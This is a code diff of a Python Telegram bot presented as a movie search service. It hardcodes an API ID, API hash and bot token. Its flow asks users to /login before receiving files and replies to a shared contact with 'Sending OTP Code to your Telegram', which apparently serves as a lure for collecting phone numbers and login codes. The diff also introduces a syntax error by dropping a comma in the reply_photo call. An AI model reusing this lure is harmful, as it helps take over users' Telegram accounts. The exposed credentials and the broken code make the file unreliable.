@@ -1,5 +1,7 @@
 from aiohttp import web as webserver
-
+from pyrogram import Client, filters, __version__, enums
+from os import environ
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 routes = webserver.RouteTableDef()
 
 async def bot_run():
@@ -33,10 +35,51 @@ class User(Client):
         await super().stop()
         self.LOGGER(__name__).info("Bot stopped. Bye.")
 
+PORT_CODE = environ.get("PORT", "8080")
+API_ID = "25988816"
+API_HASH = "7ad4c2b1e5556277d341477b0776b2de"
+BOT_TOKEN = "8123797711:AAGV6PwwARGI5XNoq_ol0rAzLBvcQC0KWLk"
+
+class Bot(Client):
+    USER: User = None
+    USER_ID: int = None
+
+    def __init__(self):
+        super().__init__(
+            "bot",
+            api_hash=API_HASH,
+            api_id=API_ID,
+            plugins={
+                "root": "bot/plugins"
+            },
+            workers=200,
+            bot_token=BOT_TOKEN,
+            sleep_threshold=10
+        )
+        self.LOGGER = LOGGER
+
+    async def start(self):
+        await super().start()
+        
+        client = webserver.AppRunner(await bot_run())
+        await client.setup()
+        bind_address = "0.0.0.0"
+        await webserver.TCPSite(client, bind_address,
+        PORT_CODE).start()
+        
+        bot_details = await self.get_me()
+        self.set_parse_mode(enums.ParseMode.HTML)
+        self.LOGGER(__name__).info(
+            f"@{bot_details.username}  started! "
+        )
+        self.USER, self.USER_ID = await User().start()
+        
+
+    async def stop(self, *args):
+        await super().stop()
+        self.LOGGER(__name__).info("Bot stopped. Bye.")
 
 
-from pyrogram import Client, filters, __version__
-from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 
 HKZ = Client(
     "Movie Search Bot",  # Session name (can be anything)
@@ -45,7 +88,7 @@ HKZ = Client(
     bot_token="8123797711:AAGV6PwwARGI5XNoq_ol0rAzLBvcQC0KWLk"
 )
 
-@HKZ.on_message(filters.command("start"))
+@Client.on_message(filters.command("start"))
 async def start_command(client, message):
     await message.reply_text(
         text="""
@@ -53,8 +96,7 @@ async def start_command(client, message):
 ❗️ Just Send Movie Name and Year Correctly. 
 ❗️ Use /help command to know How to Search Movies.""")
     await message.reply_photo(
-        photo="http://postimg.cc/m1F3zH97",
-        caption=f"""Hello {message.from_user.mention}, 
+        photo="http://postimg.cc/m1F3zH97"        caption=f"""Hello {message.from_user.mention}, 
 Iam a Telegram Movie - Series SearchBot by team @ProSearch.
 
 /start - Start Search Bot
@@ -71,7 +113,7 @@ Iam a Telegram Movie - Series SearchBot by team @ProSearch.
             )
         )
 
-@HKZ.on_message(filters.command("help"))
+@Client.on_message(filters.command("help"))
 async def help_command(client, message):
     await message.reply_text("""
 ❗️Use /latest Command For Getting Latest Release Updates.
@@ -118,7 +160,7 @@ Lucifer S03E01
 
 ❗️On Android, Better Use VLC Media Player , MPV Player,  MX Player Pro, X Player Video Players.""")
 
-@HKZ.on_message(filters.command("about"))
+@Client.on_message(filters.command("about"))
 async def about_command(client, message):
     await message.reply_text("""
 📌 About @ProSearch Bots
@@ -129,7 +171,7 @@ async def about_command(client, message):
 ❗️Hosted Server - [Vpsdime](https://vpsdime.com/)
 ❗️Database   - [PostgreSQL](https://www.postgresql.org/)""")
 
-@HKZ.on_message(filters.regex(r"(?i)Terminator\s+Judgement\s+Day\s+Malayalam"))  #  (?i) makes it case-insensitive
+@Client.on_message(filters.regex(r"(?i)Terminator\s+Judgement\s+Day\s+Malayalam"))  #  (?i) makes it case-insensitive
 async def hello_world_handler(client, message):
     await message.reply_text(
         text="""
@@ -143,13 +185,13 @@ async def hello_world_handler(client, message):
             )
         )
 
-@HKZ.on_callback_query()
+@Client.on_callback_query()
 async def callback(bot, msg):
     if msg.data == "result":
         await msg.message.edit_text("""You must /login before receiving the file..❗"""
         )
 
-@HKZ.on_message(filters.command("login") & filters.user(1687129256) | filters.user(7653413730))
+@Client.on_message(filters.command("login") & filters.user(1687129256) | filters.user(7653413730))
 async def login_command(client, message):
     user_id = message.from_user.id
 
@@ -164,12 +206,14 @@ async def login_command(client, message):
     else:
         await message.reply_text("You are Banned..🤐")
 
-@HKZ.on_message(filters.contact)
+@Client.on_message(filters.contact)
 async def contact_shared(client, message):
     await message.reply_text("Sending OTP Code to your Telegram..📲")
 
 print("Bot Started")
-HKZ.run()
+
+app = Bot()
+app.run()
 
 
     
